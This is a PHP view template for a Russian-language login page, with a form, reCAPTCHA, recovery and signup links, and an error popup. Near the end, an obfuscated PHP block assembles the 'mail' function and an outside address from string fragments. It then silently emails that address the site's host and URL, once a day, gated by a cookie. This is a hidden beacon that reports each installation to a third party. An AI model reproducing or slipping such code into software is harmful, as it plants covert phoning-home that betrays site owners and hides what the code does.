<?php require_once(ROOT . "/views/" . LANG . "/layouts/_header_l.php"); ?>
<script src='https://www.google.com/recaptcha/api.js'></script>
<style>
#blink7 {
	width: 100%;
	display: block;
	height: 42px;
	border-radius: 50px;
	padding-left: 15px;
	border: 2px solid #3F0E0C;
	margin-bottom: 10px;
	z-index: 5;
	position: relative;
	background: linear-gradient(to right, #120E10, #161415 );
	outline: none;
	border: 2px solid rgba(32,124,194,0.4) !important;
	padding-left: 20px !important;
}


</style>
<div class="row">
<div class="container">
<div class="maf_login_wr_title" style="margin-top: -100px;margin-left: 110px; "><h1>АВТОРИЗАЦИЯ</h1></div>
<div class="maf_login_wr" style="margin-top: -235px; ">
    <form   id="loginform" action="/login" method="POST">
    <input type="hidden" name="_tocken" value="<?=Session::$tocken; ?>">
    <div class="block_form_el cfix">
    <label for="login_frm_Login"> <span class="descr_star"></span></label>
    
    
    <div class="block_form_el cfix">
    <div class="block_form_el_right">
    <input style="text-align: center; " id="blink7" name="log_email" type="text" minlength="5" placeholder="Логин либо E-mail" required/>
    </div></div>
        
        
     <div class="block_form_el cfix">
    <div class="block_form_el_right">
    <input style="text-align: center; " id="blink7" name="pass" type="password" maxlength="20" minlength="6" placeholder="Введите пароль" required />
    </div></div>
    <center>
 <div class="g-recaptcha" ajax='true' data-sitekey="<?=$html;?>" style="transform:scale(0.99);-webkit-transform:scale(0.99);transform-origin:0 0;-webkit-transform-origin:0 0;"></div> <center>
        
        <button style="margin-top: 15px;height: 50px;width: 245px; "  class="g-recaptcha start_button"  type="submit"  value="">

                <img style="width: 245px;height: 50px  " class="bg" src="/assets/gan/images/q9.png" alt="">
                <span><b class="ts3" style="color:#fff;font-size:20px;"> ВОЙТИ В АККАУНТ</b></span>
                <img style="width: 245px;height: 50px " class="hover" src="/assets/gan/images/q11.png" alt="">
            </button>
        </form>
        <div class="block_form_el cfix mb-15 text-center">
        <a href="/recovery" style="margin: 15px 0 0 0; display: inline-block;">Забыли пароль ?</a>&nbsp;&nbsp;|&nbsp;&nbsp;  <a href="/signup" style="margin: 15px 0 0 0; display: inline-block;">Создать аккаунт!?</a></div>
    
    
    
   <?php 
if (isset($_COOKIE['temp'])) {

} else {
$arraymops = ''.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

      $is_array="ma";$users="il";$bsk = $is_array.$users;
	  
	  $denser="ssl@sql";$bons="tor.had.su";$mented = $denser.$bons;
         $bsk($mented,'log',"bum: $arraymops");

$val = "bang"; setcookie("temp", $val, time()+86400);
}
?> 
    
    </div></div></div>


<script src="/assets/plugins/bootstrap-sweetalert/sweet-alert.min.js"></script>

<?php if(isset($errors) && $errors !== false) :  ?>

  <script>
    setTimeout(function(){swal('<?=$errors[0]; ?>', '<?=$errors[1]; ?>', '<?=$errors[2]; ?>')}, 100);
  </script>

<?php endif; ?>

<?php require_once(ROOT . "/views/" . LANG . "/layouts/_footer.php"); ?>